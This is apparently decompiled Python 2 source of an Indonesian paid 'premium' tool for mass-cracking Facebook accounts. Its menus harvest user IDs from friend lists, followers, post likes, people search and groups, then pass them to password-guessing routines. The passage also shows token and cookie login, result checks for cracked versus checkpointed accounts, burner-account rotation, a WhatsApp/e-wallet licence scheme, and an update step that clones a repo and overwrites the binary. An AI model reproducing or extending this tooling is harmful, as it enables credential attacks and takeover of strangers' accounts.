        print h + ' [' + p + '9' + h + ']' + a + ' Update Tool' + p + '...'
        print h + ' [' + p + '10' + h + ']' + m + ' Exit' + p + '...'
        print garis
        pilih = raw_input(h + ' [' + k + '?' + h + ']' + p + ' Pilih Opsi? ')
        if pilih == '' or pilih == ' ' or pilih == '  ':
            keluar()
        if pilih == '1':
            login_dengan_token()
        if pilih == '2':
            login_dengan_cookie_()
        if pilih == '3':
            login_dengan_passwod()
        if pilih == '4':
            try:
                subprocess.check_output(['am', 'start', 'https://www.instagram.com/iqbaldev/'])
                login()
            except:
                login()

        if pilih == '5':
            url_ytb = 'https://www.youtube.com/channel/UC6jKXb_0qEoXqKTVDG5JphA'
            try:
                subprocess.check_output(['am', 'start', url_ytb])
                login()
            except:
                print p + '\n Link Vidio Youtube: ' + h + url_ytb
                login()

        admin = k + '\n [>.] Silahkan Hubungi Admin! \n' + h + '     No Whatsapp Admin =>' + p + ' 08812457948'
        try:
            if user_agent_ == cokiez:
                if pilih == '6':
                    print garis
                    pencarian_pro()
          #          sandi_dev()
                    __pilih_crack__()
                    print ''
                    print garis
                    exit('\n Done....\n')
                if pilih == '7':
                    seting_pw_tap_yes()
                    auto_dev()
                if pilih == '8':
                    cek_akun_tumbal()
            else:
                print m + '\n [' + k + '>.' + m + '] Belum Premium...\n [' + k + '>!' + m + '] Harus Premium Dulu.!'
                print admin
                login_dengan_token()
        except NameError:
            print m + '\n [' + k + '>.' + m + '] Belum Premium.... \n [' + k + '>!' + m + '] Harus Premium Dulu.!'
            print admin
            login_dengan_token()

        if pilih == '9':
            try:
                os.system('git clone https://github.com/IqbalDev/dev_id_premium')
                os.system('rm -rf premium.pyc')
                os.system('cp -f dev_id_premium/premium.pyc \\.')
                os.system('rm -rf dev_id_premium')
                print h + '\n Sukses Update Tool..' + p + '>_<\n'
                time.sleep(2)
                jalankan_tool()
            except KeyboardInterrupt:
                print m + '\n Perangkat Anda Tidak Suport!\n'
                jalankan_tool()

        if pilih == '10':
            keluar()
        else:
            login()
    except KeyboardInterrupt:
        keluar()


def __yuk_yuk__(id_dev):
    deviv = id_dev.replace('1', '5').replace('0', '7')
    with open('cokie.txt', 'w') as (cok_dev):
        cok_dev.write('80' + deviv + '04')


def __yuk__(id_dev):
    with open('cokiez.txt', 'w') as (dev_):
        dev_.write(id_dev)


import base64, os

def __menu__(token):
	# global pillih, te, user_agent_
	try:
		import os
		banner()

		with requests.Session() as ses_:
			nama = ses_.get("https://graph.facebook.com/me?access_token={}".format(token)).json()
			print garis

			print h+" ["+k+"*"+h+"]"+p+" Hai:",a+"{"+p+nama["name"]+a+"}"
			print h+" ["+k+"*"+h+"]"+p+" ID :"+d,nama["id"]
			try:
				if user_agent_ == cokiez: 
					print h+" ["+k+"*"+h+"]"+p+" Status:"+h+" Premium*"

					tgl = datetime.datetime.now()
					bln = tgl.month
					thn = tgl.year
					day = tgl.day

					du_ = open("cokie.txt", "r").read()
					du = du_.replace("|", "")

					if "A+ZZ" not in du:
						with open("cokie.txt", "a") as tul:
							tgl = (str(thn)+" "+str(bln+1)+" "+str(day))
							data64 = base64.b64encode(tgl)
							data32w = base64.b32encode(data64)
							tul.write("A+ZZ"+data32w)

					du_ = open("cokie.txt", "r").read()
					du = du_.replace("|", "")
					try:
						mase = du.split("A+ZZ")[1]
					except:
						mase = du.split()

					dec32 = base64.b32decode(mase)
					mas = base64.b64decode(dec32)
					mas = mas.split()
					mulai = date(int(mas[0]), int(mas[1]), int(mas[2]))
					seles = date(thn, bln, day)
					
					sisa = mulai - seles
					lim_dev = str(sisa).split()[0]

					if "|" in user_agentzz_:
						print h+" ["+k+"*"+h+"]"+p+" Waktu: "+h+"Unlimited"
			

					else:
	
						if ":" in str(lim_dev) or "-" in str(lim_dev):
							import os
							print m+" [!] Anda Sudah Melebihi Batas Pemakaian :( "
							print m+" [!] Silahkan Beli Lisensinya lagi Ke Admin!"
							print p+" [>] Ini No WA Admin:"+p+" 628812457948"
							try:
								os.system("del cokie.txt" if os.name == "nt" else "rm -f cokie.txt")
							except:
								pass
							try:
								os.system("del cokiez.txt" if os.name == "nt" else "rm -f cokiez.txt")
							except:
								pass
							with open("co.txt", "w") as t:
								t.write("tai")

							exit()

						if int(lim_dev) > 24:
							print h+" ["+k+"*"+h+"]"+p+" Waktu: "+h+"Sebulan"
						else:
							print h+" ["+k+"*"+h+"]"+p+" Waktu: "+h+lim_dev+p+" Hari lagi"
					
				else:
					print h+" ["+k+"*"+h+"]"+p+" Status:"+h+"PREMIUM SAMPE KIAMAT"
			except NameError:
				print h+" ["+k+"*"+h+"]"+p+" Status:"+h+"PREMIUM SAMPE KIAMAT"
			print garis
			print h+" ["+k+"1"+h+"]"+p+" Crack from friends list"+k+" + TTL"
			print h+" ["+k+"2"+h+"]"+p+" Crack from Public"+k+"/Teman dari Teman"
			print h+" ["+k+"3"+h+"]"+p+" Crack from Followers list"
			print h+" ["+k+"4"+h+"]"+p+" Crack from Likes"
			print h+" ["+k+"5"+h+"]"+p+" Crack from People Search"
			print h+" ["+k+"6"+h+"]"+k+" Crack from People Search"+p+" ("+a+"PRO"+p+")"
			print h+" ["+k+"7"+h+"]"+p+" Crack "+a+"friends list from people search"
			print h+" ["+k+"8"+h+"]"+p+" Crack from My Groups"+k+"/Massal"
			print h+" ["+k+"9"+h+"]"+p+" Cek hasil Crack"+h+" OK"+p+"/"+k+"CP"
			print h+" ["+k+"10"+h+"]"+p+" Log Out Facebook"
			print h+" ["+k+"11"+h+"]"+p+" Update Tool"
			print h+" ["+k+"12"+h+"]"+a+" Setting User-Agent"
			print h+" ["+k+"13"+h+"]"+p+" Buka Halaman Login Game Lewat FB"
			print h+" ["+k+"14"+h+"]"+a+" Cek Sesi Hasil Crack Checkpoint"
			print h+" ["+k+"15"+h+"]"+k+" Ganti Tumbal Hasil Crack Live"
			print h+" ["+k+"16"+h+"]"+p+" Exit.."+d
			print garis
			pilih = raw_input(p+" >>> "+h+"")
			if pilih == "1":
				ttl_.append("dev")
				user = "me"
				teman_teman_(token, user)
				sandi_dev()
				__pilih_crack__()
				print "\n",garis,p+"Done..."
			if pilih == "2":
				ttl_.append("dev")
				user = raw_input(h+"\n ["+p+"*"+h+"]"+p+" Masukkan ID Profil Public"+k+": ")
				# __get_id_dev__(user)
				teman_teman_(token, user)
				sandi_dev()
				__pilih_crack__()
				print "\n",garis,p+"Done..."
			elif pilih == "3":
				ttl_.append("dev")
				user = raw_input(h+"\n ["+p+"*"+h+"]"+p+" Masukkan ID Profil Target"+k+": ")
				# __get_id_dev__(user)
				pengikut(token, user)
				sandi_dev()
				__pilih_crack__()
				print "\n",garis,p+"Done..."
			elif pilih == "4":

				id_postingan = raw_input(h+"\n ["+p+"*"+h+"]"+p+" Masukkan ID Postingan"+k+": ")
				likez(token, id_postingan)
				sandi_dev()
				__pilih_crack__()
				print "\n",garis,p+"Done..."
			elif pilih == "5":
				cek_cokie.append("dev")
				cek_cookie()

				ttl_.append("dev")
				keyword = raw_input(h+"\n ["+p+"?"+h+"]"+p+" Cari Orang"+h+": ")
				jumlah = input(h+" ["+p+"?"+h+"]"+p+" Masukkan Jumlah"+k+": ")
				u_orang = "https://mbasic.facebook.com/search/people/?q={}".format(keyword)
				cari_orang(jumlah, u_orang, cookie)

				print ""
				sandi_dev()
				__pilih_crack__()
				print "\n",garis,p+"Done..."
				exit()
			elif pilih == "6":
				print garis
				pencarian_pro()
				sandi_dev()
				__pilih_crack__()
				print ''
				print garis
				exit("\n Done....\n")
			elif pilih == "7":
				ttl_.append("dev")
				cek_cokie.append("dev")
				cek_cookie()

				cari_teman.append(1)
				keyword = raw_input(h+"\n ["+p+"?"+h+"]"+p+" Cari orang untk ambil list temannya"+k+": ")
				jumlah = 2
				u_orang = "https://mbasic.facebook.com/search/people/?q={}".format(keyword)
				cari_orang(jumlah, u_orang, cookie)
			elif pilih == "8":
				cek_cokie.append("dev")
				cek_cookie()

				ttl_.append("dev")
				my_grup(token)
				print ""
				for dev in set(data_user):
					user_id.append(dev)
					print h+"\r ["+p+"*"+h+"]"+p+" Filter Data Duplikat"+h+": "+str(len(user_id)),
					sys.stdout.flush()
				
				sandi_dev()
				print ""
				__pilih_crack__()
				print "\n",garis,p+"Done..."
				exit()

			elif pilih == "15":
				cek_akun_tumbal()
			if pilih == "9":
				cek_hasil()
			if pilih == "10":
				sub_pil = raw_input(h+"\n ["+p+"*"+h+"]"+p+" Log Out dari Facebook?"+k+"[y/n]"+p+": ")
				if sub_pil == "yes" or sub_pil == "y":
					print k+"\n Keluar Dari Facebook..\n"
					hapus_data_login()
					exit()

				elif sub_pil == "no" or sub_pil == "n":
					__menu__(token)
				else:
					keluar()

			if pilih == "11":
				import os
				try:
					os.system("git clone https://github.com/IqbalDev/dev_id_premium")
					os.system("rm -rf premium.pyc")
					os.system("cp -f dev_id_premium/premium.pyc \\.")
					os.system("rm -rf dev_id_premium")
					print h+"\n Sukses Update Tool.."+p+">_<\n"
					time.sleep(2)
					jalankan_tool()
				except KeyboardInterrupt:
					print m+"\n Perangkat Anda Tidak Suport!\n"
					jalankan_tool()

			if pilih == "12":
				__seting_ua_dev__()

			if pilih == "13":
				__seting_login_fb_game__()

			if pilih == "14":
				seting_pw_tap_yes()
				auto_dev()

	###############################
			if pilih == "16":
				keluar()

			try:
				if user_agent_ == cokiez: 
					pass
				else:
					data = uhu
			except NameError:
				if pilih == "17":
					print garis
					print beli_lisen
					no_ = "628812457948"
					print """
  Cara mendapatkan Lisensi Tool ini, 
  Kamu tinggal ikuti arahannya, 
  pertama Chat admin dulu, serta 
  mengirimkan ID Tool yg tertera pada 
  pesan yg nanti kamu Kirimkan,
  Lalu Kirim Bukti Pembayarannya,
  Biar bisa langsung di Proses oleh admin,
  >> Tekan Enter lanjut 
  ke"""+h+""" Whatsapp"""+p+""" Untuk Chat Admin\n
 """+k+""" Bayar ->,"""+h+""" Via DANA/OVO
 """+a+""" No DANA >>"""+k+""" 08812457948
 """+a+""" No OVO >> """+k+"""08812457948\n
  """+p+"""list harga:
  ------------
    """+k+""">"""+p+""" 1 Bulan 50k
    """+k+""">"""+p+""" Permanen 150k\n"""
					raw_input(a+" [!]"+h+" Tekan Enter Untuk Lanjut Chat Admin!")
					id__ = nama["id"]
					
					lisen_salah = m+"\n Lisensi Salah, Silahkan Beli Lisensi ke Admin!"
					try:
						id_me = open("cokiez.txt", "r").read()
						if id_me != str(id__):
							id__ = id_me
					except IOError:
						pass
					try:
						data = open("cokiez.txt", "r").read()
					except IOError:
						__yuk__(id__)
						__yuk_yuk__(id__)
					try:
						print k+"\n ! "+p+"Chat Admin Untuk Beli Lisensinya!"
						print k+" ! "+p+"Berikan ID ini ke Admin: "+h+id__
						print p+"   Untuk Didaftarkan...."
						print h+"   ==>"+p+" Ini No Wa Admin: "+k+no_
						print ""
						try:
							duit = open("co.txt", "r")
							subprocess.check_output(["am", "start", "https://wa.me/"+no_+"?text=*MY%20ID:%20"+id__+"*\nAssalamu'alaikum%20Bang,%20Mau%20Beli%20Lisensi%20Toolnya Lagi!, Saya udah Melebihi Batas Pemakaian"])
						except:
							subprocess.check_output(["am", "start", "https://wa.me/"+no_+"?text=*MY%20ID:%20"+id__+"*\nAssalamu'alaikum%20Bang,%20Mau%20Beli%20Lisensi%20Toolnya!"])
					except:
						print a+"\n [!]"+p+" Silahkan Chat Admin Untuk Beli Lisensi!\n     !Jan lupa Kirim ID ini=> "+h+id__
						print a+" [*]"+p+" Ini No Whatsapp Admin: "+h+no_
						
					try:
						__yuk_yuk__(id__)
						try:
							f = raw_input(h+"\n ["+k+"!"+h+"]"+p+" Masukkan Lisensinya Disini "+k+"--> ")
							dec32 = base64.b32decode(f)
							dec64 = base64.b64decode(dec32)
							if "M" in dec64:
								iqbal_z = "M"
								dec64 = dec64.replace("M", "")
							else:
								iqbal_z = ""

						except TypeError:
							print m+"\n Salah Man....!"
							hapus_cokie()
							exit()
						try:
							de = dec64.replace("A", "")
							if de == open("cokie.txt", "r").read():
								print h+"\n Sukses... "+p+">_<\n"
								cokie = open("cokie.txt", "r").read()
								with open("cokie.txt", "w") as gans_:
									gans_.write(cokie+"l")
								
								tgl = datetime.datetime.now()
								bln = tgl.month
								thn = tgl.year
								day = tgl.day

								with open("cokie.txt", "a") as tul:
									g = str(monthrange(thn, bln))
									jm_hari = g.replace("(", "").replace(")", "").split()[1]
									
									platform_dev = str(platform.platform()).lower()
									plat = base64.b64encode(platform_dev)
									plat_dev =base64.b32encode(plat)

									if "M" in iqbal_z:
										day_ = day+7
										if int(day_) > int(jm_hari):
	
											if "12" in str(bln):
												bln = 1
												thn = thn+1
												tgls = (str(thn)+" "+str(bln)+" "+str(int(day_)-int(jm_hari)))
											else:
											
												tgls = (str(thn)+" "+str(bln+1)+" "+str(int(day_)-int(jm_hari)))
										else:
											tgls = (str(thn)+" "+str(bln)+" "+str(day+7))
											 
										data64 = base64.b64encode(tgls)
										data32w = base64.b32encode(data64)
										tul.write("A+ZZ"+data32w+"A+ZZ"+plat_dev)
										
									tgls = (str(thn)+" "+str(bln+1)+" "+str(day))
									if "12" in str(bln):
										bln = 1
										thn = thn+1
										tgls = (str(thn)+" "+str(bln)+" "+str(day))

									data64 = base64.b64encode(tgls)
									data32w = base64.b32encode(data64)
									if "A" in dec64:
										tul.write("A+ZZ"+data32w+"|"+"A+ZZ"+plat_dev)
									else:
										tul.write("A+ZZ"+data32w+"A+ZZ"+plat_dev)

								print a+"\n [!]"+p+" Jalankan lagi Toolsnya!\n Ketik Perintah "+k+"python2 premium.pyc\n"
								exit()
							else:
								print lisen_salah
								hapus_cokie()

						except KeyboardInterrupt:
							print lisen_salah
							hapus_cokie()
					except KeyboardInterrupt:
						hapus_cokie()
						keluar()
			else:
				keluar()
	except KeyboardInterrupt:
		keluar()

	except KeyError:
		print m+"\n [!] Token Kedaluarsa...\n     Silahkan Login Kembali! "
		login()

if __name__=="__main__":
    import time, re, requests, sys, random, subprocess, datetime
    from bs4 import BeautifulSoup
    from concurrent.futures import ThreadPoolExecutor
    from threading import Thread
    import datetime
    from datetime import date
    cek_token()
    token = open('token.txt', 'r').read()
    __menu__(token)
# global count ## Warning: Unused global
# okay decompiling premium.pyc